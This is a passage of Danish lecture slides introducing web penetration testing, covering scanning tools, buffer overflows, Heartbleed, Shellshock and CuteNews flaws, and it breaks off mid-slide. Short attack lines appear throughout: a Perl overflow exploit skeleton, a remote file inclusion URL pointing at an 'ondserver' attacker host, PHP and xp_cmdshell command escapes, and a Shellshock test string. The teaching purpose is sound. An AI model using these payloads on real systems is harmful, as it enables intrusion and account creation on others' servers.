\documentclass[20pt,landscape,a4paper,footrule]{foils}
\usepackage{solido-network-slides}
\usepackage{pdf14}
% Aarhus:Penetration testing II - webbaserede angreb

% Mål:
% Introduktion til penetrationstest.

% Forudsætninger:
% Der forventes kendskab til TCP/IP på brugerniveau.

% Beskrivelse:
% Websystemer idag er kendetegnede ved at være meget dynamiske, komplekse og store - og derfor ofte fyldt med sikkerhedsfejl. På dette foredrag vil vi se nærmere på teknologierne og de alment forekommende fejl i websystemer og andre emner: 

% * Apache HTTP server og sikkerhed
% * Hello world of insecure CGI programming
% * Command og SQL injection
%* File inclusion
%* PHP sikkerhed
%* J2EE sikkerhed
%* Paros proxy
%* Webcrawlere
%* Open Web Application Security Project OWASP.

%Der vil være demonstrationer af sårbarheder på alle foredragene - typisk med open source programmer, således at deltagerne kan afprøve de selvsamme demoer hjemme.

%Note: der tages udgangspunkt i open source og UNIX, men resultater og principper kan overføres til ASP og .NET teknologierne.

% Husk:
% sqlmap
% Skipfish
% w3af

% HK versionen
% Websystemer i dag er kendetegnede ved at være meget dynamiske, komplekse og store - og derfor ofte fyldt med sikkerhedsfejl. 
% På dette foredrag vil vi se nærmere på teknologierne og de alment forekommende fejl i websystemer og tilhørende emner. 
% Vi gennemgår OWASP Top-10 og giver eksempler på værktøjer til at undersøge websystemer.

% * HTTP protokoller, servere og sikkerhed
% * Proxy programmer Tamper Data og Burp Suite
% * Open Web Application Security Project OWASP Top-10
% * Hello world of insecure CGI programming
% * Command og SQL injection, sqlmap 
% * PHP sikkerhed, Rails, Python - introduktion og gode råd
% * Webcrawlere og web scannere Nikto, w3af, Skipfish




\begin{document}

%\slide{}

%{Penetration testing II\\\normalsize webbaserede angreb}

\mytitlepage
{Penetration testing II\\ webbaserede angreb}

%\begin{alltt}
%\tiny 
%\centerline{$Id: pentest-II-foredrag.tex,v 1.2 2006/11/08 14:41:45 hlk Exp $}
%\end{alltt}

\LogoOn


\slide{Agenda}


\begin{list1}
\item Idag er en introduktion og forberedelse til workshops:
\item 5. November pentest-II Web hacking\\
\link{http://www.hk.dk/Aktuelt/Kalender/D2259208266}
\item 24. November pentest-III Wireless 802.11 hacking\\
\link{http://www.hk.dk/Aktuelt/Kalender/D2259208268}
\item  27. November pentest-IV Cryptography og Cracking\\
\link{http://www.hk.dk/Aktuelt/Kalender/D2259208269}
\end{list1}


Hvis man vil på workshops og udføre angreb er det et krav at medbringe laptop med {\bf virtualisering og Kali Linux installeret - \bf FØR workshop}

Brug vejledningen \emph{Kali Linux Hard Disk Install} fra \link{http://docs.kali.org/}\\
 og eksempelvis Virtual box \link{https://www.virtualbox.org/}

%\dagsplan

\slide{Formålet idag}

\hlkimage{5cm}{dont-panic.png}
\centerline{\color{titlecolor}\LARGE Don't Panic!}


\begin{list1}
\item Introducere basale penetrationstestmetoder mod webservere og web
  applikationer 
\item Gøre deltagerne istand til at udforske området ved at henvise
  til gode kilder
\end{list1}

\slide{Planen idag}

\hlkimage{10cm}{Shaking-hands_web.jpg}

\begin{list1}
\item Kl 17-20
\item Mindre foredrag mere snak
\item Mindre enetale, mere foredrag 2.0 med socialt medie, informationsdeling og interaktion
\end{list1}



\slide{Aftale om test af netværk}

{\bfseries Straffelovens paragraf 263 Stk. 2. Med bøde eller fængsel indtil 1 år og 6 måneder straffes den, der uberettiget skaffer sig adgang til en andens oplysninger eller programmer, der er bestemt til at bruges i et informationssystem. }

Hacking kan betyde:
\begin{list2}
\item At man skal betale erstatning til personer eller virksomheder
\item At man får konfiskeret sit udstyr af politiet
\item At man, hvis man er over 15 år og bliver dømt for hacking, kan
  få en bøde - eller fængselsstraf i alvorlige tilfælde 
\item At man, hvis man er over 15 år og bliver dømt for hacking, får
en plettet straffeattest. Det kan give problemer, hvis man skal finde
et job eller hvis man skal rejse til visse lande, fx USA og
Australien
\item Frygten for terror har forstærket ovenstående - så lad være!
\end{list2}


\slide{Er sikkerhedstest af webservere interessant?}

\hlkimage{14cm}{web-dynamic.png}

\begin{list1}
\item Sikkerhedsproblemer i netværk er mange
\item Kan være et krav fra eksterne - eksempelvis VISA PCI krav
\end{list1}


\slide{Emneområder}

\begin{list2}
\item Hvad er sikkerhedstest af servere og webservere
\item Konsulentens udstyr - vil du teste websites
\item Kali Linux, kom igang
\item HTTP protokoller, servere og sikkerhed
\item Proxy programmer Tamper Data og Burp Suite
\item Hello world of insecure CGI programming
\item Command og SQL injection, sqlmap 
\item PHP sikkerhed, Rails, Python - introduktion og gode råd
\item Webcrawlere og web scannere Nikto, w3af, Skipfish
\item Open Web Application Security Project OWASP Top-10 og WebGoat
\end{list2}

\slide{ Introduktion - begreber og teknologierne}

\begin{list1}
\item Sikkerhedstest / penetrationstest
\item Afprøvning af sikkerhedsforanstaltninger
\item evaluering af sikkerhedsniveau ved hjælp af \emph{hackerværktøjer}  
\item Kaldes tillige sårbarhedstest, sårbarhedsanalyse m.v.
\item Ekstern - udføres via internet 
\item Intern, inside, on-site - udføres hos kunden typisk over LAN og
  bag firewall
\end{list1}

\link{http://www.google.com/search?q=sikkerhedstest}

\slide{Blackbox, greybox og whitebox}

\begin{list1}
\item Forudsætninger og forudgående kendskab til miljøet
\item 
Afhængig af informationer tilgængelige: White, Grey og Black Box testning. 
\begin{list2}
\item Black Box testen involverer en sikkerhedstestning af et netværk uden
insider viden udover den IP-adresse, der
ønskes testet. Svarer til en fjendtlig hacker og giver derfor det mest realistiske billede af netværkets sårbarhed overfor angreb udefra. Men er dårlig ressourceudnyttelse.  

\item White Box testen. Sikkerhedsspecialisten har både før og under testen fuld adgang til alle informationer om det scannede netværk. Analysen vil derfor kunne afsløre sårbarheder, der ikke umiddelbart er synlige for en almindelig
angriber. En White Box test er typisk mere omfattende end en Black Box
test og forudsætter en højere grad af deltagelse fra kundens side, men
giver en meget detaljeret og tilbundsgående undersøgelse.  

\item En Grey Box test er et kompromis mellem en White Box
og en Black Box test. Typisk vil sikkerhedsspecialisten udover en
IP-adresse være i besiddelse af de mest grundlæggende
systemoplysninger: Hvilken type af server der er tale om (mail-,
webserver eller andet), operativsystemet og eventuelt om der er
opstillet en firewall foran serveren. 
\end{list2}
\end{list1}


\slide{Bøger og resourcer}

\centerline{Konsulentens udstyr - vil du være sikkerhedskonsulent}

\begin{list1}
\item Sikkerhedskonsulenterne bruger typisk Open Source værktøjer på Linux og
enkelte systemer med Windows - jeg bruger helst Windows 7 idag
\item Laptops, gerne flere, men een er nok til at lære!
\begin{list2}
\item \emph{A Hands-On Introduction to Hacking
by Georgia Weidman}, June 2014\\
 \link{http://www.nostarch.com/pentesting}
\item \emph{The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws}
Dafydd Stuttard, Marcus Pinto, Wiley September 2011 ISBN: 978-1118026472
\item \emph{Metasploit The Penetration Tester's Guide}
by David Kennedy, Jim O'Gorman, Devon Kearns, and Mati Aharoni\\
\link{http://nostarch.com/metasploit}
\item Metasploit Unleashed - gratis kursus i Metasploit\\
\link{http://www.offensive-security.com/metasploit-unleashed/}
\link{http://mdsec.net/wahh/}
\end{list2}
\end{list1}




\slide{Hackerværktøjer}
% måske til reference afsnit?

\hlkimage{3cm}{hackers_JOLIE+1995.jpg}

\begin{list2}
\item Nmap, Nping - tester porte, godt til firewall admins \link{http://nmap.org}
\item Kali Linux/Backtrack \link{http://kali.org}
\item Metasploit Framework \link{http://www.metasploit.com/}
\item Wireshark avanceret netværkssniffer - \link{http://http://www.wireshark.org/} 
\item Skipfish \link{http://code.google.com/p/skipfish/}
\item Burpsuite \link{http://portswigger.net/burp/}
\item OpenBSD operativsystem med fokus
  på sikkerhed  \link{http://www.openbsd.org} 
\end{list2}

Source: Acid Burn / Angelina Jolie fra Hackers 1995

% 
%page
\slide{Hvad skal der ske?}

\begin{list1}
\item Tænk som en hacker
\item Rekognoscering
\begin{list2}
\item ping sweep, port scan
\item OS detection - TCP/IP eller banner grab
\item Servicescan - rpcinfo, netbios, ...
\item telnet/netcat interaktion med services
\end{list2}
\item Udnyttelse/afprøvning: OpenVAS, nikto, exploit programs
\item Oprydning/hærdning vises måske ikke, men I bør i praksis:
\end{list1}

\vskip 2cm 
\centerline{\hlkbig Vi går idag kun efter webservere}

\slide{Internet idag}

\hlkimage{14cm}{images/server-client.pdf}

\begin{list1}
\item Klienter og servere
\item Rødder i akademiske miljøer
\item Protokoller der er op til 20 år gamle
\item Meget lidt kryptering, mest på http til brug ved e-handel 
\end{list1}

\slide{OSI og Internet modellerne}

\hlkimage{14cm,angle=90}{images/compare-osi-ip.pdf}


%\slide{HTTP basic}


\slide{Informationsindsamling}

\begin{list1}
\item Indsamling af informationer kan være aktiv eller passiv indsamling i forhold
  til målet for angrebet
\item {\bf passiv} kunne være at lytte med på trafik eller søge i databaser
  på Internet: google, whois, archive.org m.fl.
\item {\bf aktiv indsamling} er eksempelvis at sende ICMP pakker og
  registrere hvad man får af svar, portscan m.v.
\end{list1}


\slide{Firefox plugins og whois systemet}

\begin{list1}
\item IP adresserne administreres i dagligdagen af et antal Internet
  registries, hvor de største er:
\begin{list2}
\item RIPE (Réseaux IP Européens)  \link{http://ripe.net}
\item ARIN American Registry for Internet Numbers \link{http://www.arin.net}
\item Asia Pacific Network Information Center \link{http://www.apnic.net}
\item LACNIC (Regional Latin-American and Caribbean IP Address
  Registry) - Latin America and some Caribbean Islands
  \link{http://www.lacnic.net} 
\item AfriNIC African Internet Numbers Registry \link{http://www.afrinic.net}
\end{list2}
\item disse fem kaldes for Regional Internet Registries (RIRs) i
  modsætning til Local Internet Registries (LIRs) og National Internet
  Registry (NIR) 
\end{list1}

\vskip 1cm
\centerline{Firefox add-on galore, brug dem - AS nummer, IP, whois, country}

\slide{nmap port sweep efter port 80/TCP}

\begin{list1}
  \item Port 80 TCP er webservere
\end{list1}

\begin{alltt}
\small # {\bfseries nmap  -p 80 192.0.2.0/24}

Starting nmap V. 3.00 ( www.insecure.org/nmap/ )
Interesting ports on router.kramse.dk (192.0.2.129):
Port       State       Service
80/tcp     filtered    http                    

Interesting ports on www.kramse.dk (192.0.2.139):
Port       State       Service
80/tcp     open        http                    

Interesting ports on  (192.0.2.145):
Port       State       Service
80/tcp     open        http                    

\end{alltt}


\slide{OS detection}
\begin{alltt}
\footnotesize
# nmap -O ip.adresse.slet.tet \emph{scan af en gateway}
Starting nmap 3.48 ( http://www.insecure.org/nmap/ ) at 2003-12-03 11:31 CET
Interesting ports on gw-int.security6.net (192.0.2.123):
(The 1653 ports scanned but not shown below are in state: closed)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1080/tcp open  socks
5000/tcp open  UPnP
Device type: general purpose
Running: FreeBSD 4.X
OS details: FreeBSD 4.8-STABLE
Uptime 21.178 days (since Wed Nov 12 07:14:49 2003)
Nmap run completed -- 1 IP address (1 host up) scanned in 7.540 seconds
\end{alltt}

\begin{list2}
\item lavniveau måde at identificere operativsystemer på, prøv også
  \verb+nmap -A+
\item send pakker med \emph{anderledes} indhold
\item Reference: \emph{ICMP Usage In Scanning} Version 3.0, 2000
  Ofir Arkin\\ \link{http://www.sys-security.com/html/projects/icmp.html}
\end{list2}



\slide{Demo: Kali Linux the new backtrack}

\hlkimage{\linewidth-2cm}{kali-linux.png}

\begin{list1}
\item BackTrack \link{http://www.backtrack-linux.org}
\item  Kali \link{http://www.kali.org/}
\end{list1}

\slide{it's a Unix system, I know this}


\hlkimage{24cm}{twitter-unix-security.png}

\begin{list1}
\item Skal du igang med sikkerhed?
\item Installer et netværk, evt. bare en VMware, Virtualbox, Parallels, Xen, GNS3, ...
\item Brug Kali Linux, se evt. youtube videoer om programmerne\\
- det er en værktøjskasse du tager frem ikke en kult \smiley
\end{list1}

Quote fra Jurassic Park
\link{http://www.youtube.com/watch?v=dFUlAQZB9Ng}

\slide{Nping check TCP socket connection}

\begin{alltt}\footnotesize
hlk@pumba:nmap-5.51$ nping -6  www.solidonetworks.com 

Starting Nping 0.5.51 ( http://nmap.org/nping ) at 2011-03-04 10:18 CET
SENT (0.0061s) Starting TCP Handshake > 2a02:9d0:10::9:80
RECV (0.0224s) Handshake with 2a02:9d0:10::9:80 completed
SENT (1.0213s) Starting TCP Handshake > 2a02:9d0:10::9:80
RECV (1.0376s) Handshake with 2a02:9d0:10::9:80 completed
SENT (2.0313s) Starting TCP Handshake > 2a02:9d0:10::9:80
RECV (2.0476s) Handshake with 2a02:9d0:10::9:80 completed
SENT (3.0413s) Starting TCP Handshake > 2a02:9d0:10::9:80
RECV (3.0576s) Handshake with 2a02:9d0:10::9:80 completed
SENT (4.0513s) Starting TCP Handshake > 2a02:9d0:10::9:80
RECV (4.0678s) Handshake with 2a02:9d0:10::9:80 completed
 
Max rtt: 16.402ms | Min rtt: 16.249ms | Avg rtt: 16.318ms
TCP connection attempts: 5 | Successful connections: 5 | Failed: 0 (0.00%)
Tx time: 4.04653s | Tx bytes/s: 98.85 | Tx pkts/s: 1.24
Rx time: 4.06292s | Rx bytes/s: 49.23 | Rx pkts/s: 1.23
Nping done: 1 IP address pinged in 4.07 seconds
\end{alltt}

\link{http://nmap.org}





\slide{buffer overflows et C problem}

\begin{list1}
\item {\bfseries Et buffer overflow}
er det der sker når man skriver flere data end der er afsat plads til
i en buffer, et dataområde. Typisk vil programmet gå ned, men i visse
tilfælde kan en angriber overskrive returadresser for funktionskald og
overtage kontrollen. 
\item {\bfseries Stack protection} 
er et udtryk for de systemer der ved hjælp af operativsystemer,
programbiblioteker og lign. beskytter stakken med returadresser og
andre variable mod overskrivning gennem buffer overflows. StackGuard
og Propolice er nogle af de mest kendte.
\end{list1}


\slide{Buffer og stacks}

\hlkimage{20cm}{buffer-overflow-1.pdf}

\begin{alltt}
main(int argc, char **argv)
\{      char buf[200];
        strcpy(buf, argv[1]); 
        printf("%s\textbackslash{}n",buf);
\}
\end{alltt}


\slide{Overflow - segmentation fault }

\hlkimage{20cm}{buffer-overflow-2.pdf}


\begin{list1}
\item Bad function overwrites return value!
\item Control return address
\item Run shellcode from buffer, or from other place
\end{list1}


\slide{Exploits - udnyttelse af sårbarheder}

\begin{list1}
\item exploit/exploitprogram er
\begin{list2}
\item udnytter eller demonstrerer en sårbarhed
\item rettet mod et specifikt system.
\item kan være 5 linier eller flere sider
\item Meget ofte Perl eller et C program 
\end{list2}
\end{list1}


\slide{Exploits}

\vskip 1 cm

\begin{alltt}
$buffer = ""; 
$null = "\textbackslash{}x00"; \pause
$nop = "\textbackslash{}x90"; 
$nopsize = 1; \pause
$len = 201; // what is needed to overflow, maybe 201, maybe more!
$the_shell_pointer = 0xdeadbeef; // address where shellcode is 
# Fill buffer
for ($i = 1; $i < $len;$i += $nopsize) \{
    $buffer .= $nop;
\}\pause
$address = pack('l', $the_shell_pointer);
$buffer .= $address;\pause
exec "$program", "$buffer";
\end{alltt}
\vskip 1 cm
\centerline{Demo exploit in Perl}
%Eksempel på webserver buffer overflow, nosejob?

\slide{Privilegier least privilege}

\begin{list1}
\item Hvorfor afvikle applikationer med administrationsrettigheder -
  hvis der kun skal læses fra eksempelvis en database?
\item {\bfseries least privilege} 
betyder at man afvikler kode med det mest
restriktive sæt af privileger - kun lige nok til at
opgaven kan udføres
\item Dette praktiseres ikke i webløsninger i Danmark - eller meget få steder
\end{list1}

\slide{Privilegier privilege escalation}
\begin{list1}
\item {\bfseries privilege escalation} er når man på en eller anden vis
opnår højere privileger på et system, eksempelvis som
følge af fejl i programmer der afvikles med højere
privilegier. Derfor HTTPD servere på UNIX afvikles som
nobody - ingen specielle rettigheder.
\item En angriber der kan afvikle vilkårlige kommandoer kan ofte finde
  en sårbarhed som kan udnyttes lokalt - få rettigheder = lille skade
\end{list1}


\slide{local vs. remote exploits}

\begin{list1} 
\item {\bfseries local vs. remote}
angiver om et exploit er rettet mod
en sårbarhed lokalt på maskinen, eksempelvis
opnå højere privilegier, eller beregnet
til at udnytter sårbarheder over netværk
\item {\bfseries remote root exploit} 
- den type man frygter mest, idet
det er et exploit program der når det afvikles giver
angriberen fuld kontrol, root user er administrator
på UNIX, over netværket. 
\item {\bfseries zero-day exploits} dem som ikke offentliggøres - dem
  som hackere holder for sig selv. Dag 0 henviser til at ingen kender
  til dem før de offentliggøres og ofte er der umiddelbart ingen
  rettelser til de sårbarheder
\end{list1}


\slide{Apache Tomcat Null Byte sårbarhed}

\hlkimage{25cm}{tomcat-exploit-bid-6721.png}

\begin{list1}
\item BID 6721 Apache Tomcat Null Byte Directory/File Disclosure Vulnerability
\item \link{http://www.securityfocus.com/bid/6721/}
\item CAN-2003-0042
\end{list1}


\slide{Apache Tomcat sårbarhed - sårbar 3.3.1}

\hlkimage{25cm}{tomcat-exploit-bid-6721-result.png}

\centerline{Sårbar version af Tomcat kører på serveren}

\slide{Apache Tomcat sårbarhed - opdateret Tomcat 5.5.20}

\hlkimage{25cm}{tomcat-exploit-bid-6721-non-result.png}

\centerline{efter \emph{opgradering} er serveren ikke sårbar mere}



\slide{CuteNews}

\hlkimage{17cm}{images/cutenews-1.pdf}  

% Husk ref til stedet hvor man kan hente softwaren
\centerline{Lille nemt nyhedssystem} 

Mit demosystem virker ikke mere, fordi installationen er blevet \emph{for sikker}

\slide{CuteNews}

\hlkimage{16cm}{images/demo-cutenews-1.pdf}

\begin{list1}
\item CuteNews indeholder sårbarheder
\item Sårbarheden er beskrevet på: \link{http://www.osvdb.org/9557}
\item Softwaren findes på: \link{http://cutephp.com/cutenews/}
\end{list1}

\slide{CuteNews - normal virkemåde}

\hlkimage{20cm}{images/demo-cutenews-2.pdf}

\slide{CuteNews - CutePath PHP injection}

\hlkimage{20cm}{images/demo-cutenews-3.pdf}
\begin{list1}
\item \verb!http://server/cutenews/show_archives.php?!\\
{\bfseries \verb!cutepath=http://ondserver/files/pentest/!}
\end{list1}

\slide{CuteNews - detaljer}

\begin{list2}
\item Henter config.php i cutepath - søgesti
\item Cutepath kan ændres og derved kan filen \verb+data/config.php+ hentes
  fra en vilkårlig server på Internet
\item Webserveren \emph{henter filen} - ud
gennem firewall
\item PHP fortolkeren på webserveren udfører kommandoerne
\end{list2}
\centerline{\bf NB: ikke kun problem for PHP}

\slide{PHP shell escapes}

\begin{list1}
\item Hvad indeholder hackerens udgave af filen \verb+data/config.php+ \\
- alt, bagdøre, hack scripts, exploits
\end{list1}
\begin{alltt}
<pre>
<?php passthru("{\bfseries netstat -an && ifconfig -a}"); ?>
</pre>
\end{alltt}
\begin{list1}
\item Andre shell escapes:
\begin{list2}
\item Perl: \verb+print `/usr/bin/finger $input{'command'}`;+
\item UNIX shell: \verb+`echo hej`+
\item Microsoft SQL: \verb+exec master..xp_cmdshell 'net user test testpass /ADD'+
\end{list2}
\end{list1}
%$

\vskip 1 cm

\centerline{\bfseries resultat: webserveren sender data ud via normal HTTP}



\slide{CuteNews opsummering}

\begin{list1}
\item Opsummering af CuteNews
\begin{list2}
\item at man skal validere alle input
\item man skal passe på \emph{shell escapes}
\item Pas på små programmer du lægger på et website
\item Pas på STORE programmer du lægger på et website
\end{list2}
\item {\color{red}
Man kan altså ikke stole på brugeren!}
\end{list1}



\slide{Curl - the HTTP swiss army knife}

\begin{quote}
	What is curl?
curl is a command line tool and library for transferring data with URL syntax, supporting DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, Telnet and TFTP. curl supports SSL certificates, HTTP POST, HTTP PUT, FTP uploading, HTTP form based upload, proxies, HTTP/2, cookies, user+password authentication (Basic, Digest, NTLM, Negotiate, kerberos...), file transfer resume, proxy tunneling and more.
\end{quote}

Source: \link{http://curl.haxx.se/}


\slide{SSL}

\begin{quote}
The 'S' in HTTPS stands for 'secure' and the security is provided by SSL/TLS. SSL/TLS is a standard network protocol which is implemented in every browser and web server to provide confidentiality and integrity for HTTPS traffic.
\end{quote}

\begin{list1}
\item Nu vi snakker om kryptering - SSL overalt?
\item Kan vi klare det på vores servere?
\pause
\item Google kan:\\
\link{http://www.imperialviolet.org/2010/06/25/overclocking-ssl.html}
\item Men alt for få gør det
\end{list1}

\slide{Stadig i tvivl om SSL}

\begin{list1}
\item Hvilke versioner af SSL/TLS?
\item Secure Sockets Layer - Transport Layer Security
\item SSL Survey HTTP Rating Guide
version 1.0 (5 July 2010) Copyright © 2010 Qualys SSL Labs (www.ssllabs.com)\\
 {\footnotesize\link{https://media.blackhat.com/bh-us-10/whitepapers/Ristic/BlackHat-USA-2010-Ristic-Qualys-SSL-Survey-HTTP-Rating-Guide-wp-v1.pdf}}
\end{list1}
\pause
\centerline{Næste spørgsmål er så hvilke rod-certifikater man stoler på ...}


\slide{Safe encrypted protocols}

{\bf \LARGE Sorry, none}

\begin{quote}
The 'S' in HTTPS stands for 'secure' and the security is provided by SSL/TLS. SSL/TLS is a standard network protocol which is implemented in every browser and web server to provide confidentiality and integrity for HTTPS traffic.
\end{quote}

OpenSSL, LibreSSL, Apple SSL flaw exit exit exit!, Android SSL, certs certs cert!!!111, SSLv3, Heartbleed

\centerline{Sorry, brain overflow from SSL/TLS vulnerabilities}

Sources: see my blog posts about heartbleed for more links and tools\\ 
{\small\link{http://www.version2.dk/blog/openssl-er-doed-laenge-leve-libressl-57640}\\
\link{http://www.version2.dk/blog/opdater-openssl-og-dit-os-nu-57202}}

\slide{Heartbleed CVE-2014-0160}

\hlkimage{22cm}{heartbleed-com.png}

Source: \link{http://heartbleed.com/}

\slide{Heartbleed CVE-2014-0160 hacking}

\begin{alltt}\footnotesize
  06b0: 2D 63 61 63 68 65 0D 0A 43 61 63 68 65 2D 43 6F  -cache..Cache-Co
  06c0: 6E 74 72 6F 6C 3A 20 6E 6F 2D 63 61 63 68 65 0D  ntrol: no-cache.
  06d0: 0A 0D 0A 61 63 74 69 6F 6E 3D 67 63 5F 69 6E 73  ...action=gc_ins
  06e0: 65 72 74 5F 6F 72 64 65 72 26 62 69 6C 6C 6E 6F  ert_order&billno
  06f0: 3D 50 5A 4B 31 31 30 31 26 70 61 79 6D 65 6E 74  =PZK1101&payment
  0700: 5F 69 64 3D 31 26 63 61 72 64 5F 6E 75 6D 62 65  _id=1&{\bf card_numbe}
  0710: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX  {\bf r=4060xxxx413xxx}
  0720: 39 36 26 63 61 72 64 5F 65 78 70 5F 6D 6F 6E 74  {\bf 96&card_exp_mont}
  0730: 68 3D 30 32 26 63 61 72 64 5F 65 78 70 5F 79 65  {\bf h=02&card_exp_ye}
  0740: 61 72 3D 31 37 26 63 61 72 64 5F 63 76 6E 3D 31  {\bf ar=17&card_cvn=1}
  0750: 30 39 F8 6C 1B E5 72 CA 61 4D 06 4E B3 54 BC DA  {\bf 09}.l..r.aM.N.T..
\end{alltt}

\begin{list2}
\item Obtained using Heartbleed proof of concepts - Gave full credit card details
\item "can XXX be exploited" - yes, clearly! PoCs ARE needed\\
without PoCs even Akamai wouldn't have repaired completely!
\item The internet was ALMOST fooled into thinking getting private keys\\
 from Heartbleed was not possible - scary indeed.
\end{list2}

\slide{Proof of concept programs exist - god or bad?}

\centerline{Some of the tools released shortly after Heartbleed announcement}
\begin{list2}
\item \link{https://github.com/FiloSottile/Heartbleed} tool i Go\\
site \link{http://filippo.io/Heartbleed/}
\item \link{https://github.com/titanous/heartbleeder} tool i Go
\item \link{http://s3.jspenguin.org/ssltest.py} PoC
\item \link{https://gist.github.com/takeshixx/10107280} test tool med STARTTLS support
\item \link{http://possible.lv/tools/hb/} test site
\item \link{https://twitter.com/richinseattle/status/453717235379355649} Practical Heartbleed attack against session keys links til, \link{https://www.mattslifebytes.com/?p=533} og "Fully automated here "\\ \link{https://www.michael-p-davis.com/using-heartbleed-for-hijacking-user-sessions/}

\item Metasploit er også opdateret på master repo\\ \link{https://twitter.com/firefart/status/453758091658792960}\\
\link{https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/ssl/openssl_heartbleed.rb}
\end{list2}

\slide{Bettercrypto.org}

\hlkimage{20cm}{bettercrypto-nginx.png}
\begin{quote}
Overview

This whitepaper arose out of the need for system administrators to have an updated, solid, well researched and thought-through guide for configuring SSL, PGP, SSH and other cryptographic tools in the post-Snowden age. ... This guide is specifically written for these system administrators. 
\end{quote}

\link{https://bettercrypto.org/}


\slide{Shellshock CVE-2014-6271 - and others}

\hlkimage{20cm}{shellshock-ubuntu.png}

Source:
\link{https://en.wikipedia.org/wiki/Shellshock_(software_bug)}

\slide{Shellshock - multiple vulnerabilities}

Here is an example of a system that has a patch for CVE-2014-6271 but not CVE-2014-7169:

\hlkimage{15cm}{shellshock-CVE-2014-7169.png}


\verb+X='() { (a)=>\' bash -c "echo date"+

Source: \link{https://en.wikipedia.org/wiki/Shellshock_(software_bug)}


\slide{Metasploit and Armitage}

\begin{list1}
\item Still rocking the internet\\
\link{http://www.metasploit.com/}
\item Armitage GUI fast and easy hacking for Metasploit\\
\link{http://www.fastandeasyhacking.com/}
\item Metasploit Unleashed\\
\link{http://www.offensive-security.com/metasploit-unleashed/Main_Page}
\end{list1}

Kilde:\\
{\small \link{http://www.metasploit.com/redmine/projects/framework/wiki/Release_Notes_360}}

\slide{The Exploit Database - dagens buffer overflow}

\hlkimage{20cm}{exploit-db.png}

\centerline{\link{http://www.exploit-db.com/}}



\slide{Nikto webscanner}

\hlkimage{2cm}{nikto.jpg}

\begin{quote}
{\bf Description}
Nikto is an Open Source (GPL) web server scanner which performs
comprehensive tests against web servers for multiple items, including
over 3200 potentially dangerous files/CGIs, versions on over 625
servers, and version specific problems on over 230 servers. Scan items
and plugins are frequently updated and can be automatically updated
(if desired).   
\end{quote}

\begin{list1}
\item Nem at starte, checker en hel del - og kan selvfølgelig udvides
\item \verb+nikto -host 127.0.0.1 -port 8080+  
\item Vi afprøver nu følgende programmer sammen:
\item Nikto web server scanner \link{http://cirt.net/nikto2}
\end{list1}


\slide{Demo: Nikto}

\begin{alltt}
\small
Script started on Tue Nov  7 17:43:54 2006
$  nikto -host 127.0.0.1 -port 8080 ^M
---------------------------------------------------------------------------
- Nikto 1.35/1.34     -     www.cirt.net
+ Target IP:       127.0.0.1
+ Target Hostname: localhost.pentest.dk
+ Target Port:     8080
+ Start Time:      Tue Nov  7 17:43:59 2006
...
+ /examples/ - Directory indexing enabled, also default JSP examples. (GET)
+ /examples/jsp/snp/snoop.jsp - Displays information about page
retrievals, including other users. (GET)
+ /examples/servlets/index.html - Apache Tomcat default JSP pages
present. (GET)
...  
\end{alltt}
%$

\begin{list1}
\item Demo nikto - burde finde nogle ting, men finder dog ikke vores Null Byte
\item Falske positiv vs falske negativ!
\end{list1}


\slide{Skipfish}

\hlkimage{16cm}{skipfish-screen.png}

\begin{list1}
\item Vi afprøver nu følgende program sammen:
\item Skipfish fully automated, active web application security reconnaissance tool.
\item Af Michal Zalewski \link{http://code.google.com/p/skipfish/}
\end{list1}


\slide{Tamper Data}


\hlkimage{14cm}{tamper-data.png}


\link{https://addons.mozilla.org/en-US/firefox/addon/tamper-data/}


\slide{webscarab}

\hlkimage{8cm}{webscarab_logo.png}

\begin{list1}
\item JAVA framework til udvikling af værktøjer til HTTP og HTTPS undersøgelse
\item Er en web Proxy, men inkluderer fuzzing og
  session id undersøgelse  
\end{list1}
\link{https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project}

\slide{webscarab spider}

\hlkimage{14cm}{webscarab-spider.png}

\slide{Burp Suite}

\hlkimage{19cm}{burp-suite-1.png}

\begin{list1}
\item Burp Suite af Dafydd Stuttard \link{http://portswigger.net/burp/}
\item Twitter @PortSwigger
\end{list1}


\slide{Burpsuite}

\begin{quote}
Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application's attack surface, through to finding and exploiting security vulnerabilities.

Burp gives you full control, letting you combine advanced manual techniques with state-of-the-art automation, to make your work faster, more effective, and more fun.
\end{quote}

Burp suite indeholder både proxy, spider, scanner og andre værktøjer i samme pakke - NB: EUR 249 per user per year.

\link{http://portswigger.net/burp/}



\slide{W3af}

\hlkimage{15cm}{w3af-logo.png}

\begin{list1}
\item W3af Web Application Attack and Audit Framework
\item \link{http://w3af.sourceforge.net/}
\end{list1}




\slide{Kodekvaliteten}

\begin{list1}
\item Hvorfor er programmerne stadig sårbare?
\item {\bf Programmer idag er komplekse!}
\item NU snakker vi kode ... og høj kvalitet er mere sikker.
\item Hudson Extensible continuous integration server \link{http://hudson-ci.org/}
\item Sonar \link{http://www.sonarsource.org/}
\item Yasca can scan source code written in Java, C/C++, HTML, JavaScript, ASP, ColdFusion, PHP, COBOL, .NET, and other languages. Yasca can integrate easily with other tools\\
\link{http://www.scovetta.com/yasca.html}

\item Automatisk analyse af software\\
\link{http://samate.nist.gov/index.php/Source_Code_Security_Analyzers.html}
\end{list1}

NB: du skal stadig tænke dig om :-)


\slide{Konfigurationsfejl - ofte overset}

\begin{list1}
\item Forkert brug af programmer er ofte overset
\begin{list2}
\item opfyldes forudsætningerne
\item er programmet egnet til dette miljø
\item er man udannet/erfaren i dette produkt
\end{list2}
\item Kunne I finde på at kopiere cmd.exe til
/scripts kataloget på en IIS?
\item Det har jeg engang været ude for at en kunde havde gjort!
\item hvis I under test af en server opdager at denne har
  /scripts/cmd1.exe eller "FTP-scripts" til at hente værktøjer ...
så er den pågældende server formentlig kompromitteret 
\end{list1}

\slide{Insecure programming}

\vskip 2 cm

\begin{list1}
\item Problem:\\
Ønsker et simpelt CGI program, en web udgave af finger
\item Formål:\\
Vise oplysningerne om brugere på systemet
\end{list1}

\slide{review af nogle muligheder}

\begin{list1}
\item ASP
\begin{list2}
\item server scripting, meget generelt - man kan alt
\end{list2}

\item SQL
\begin{list2}
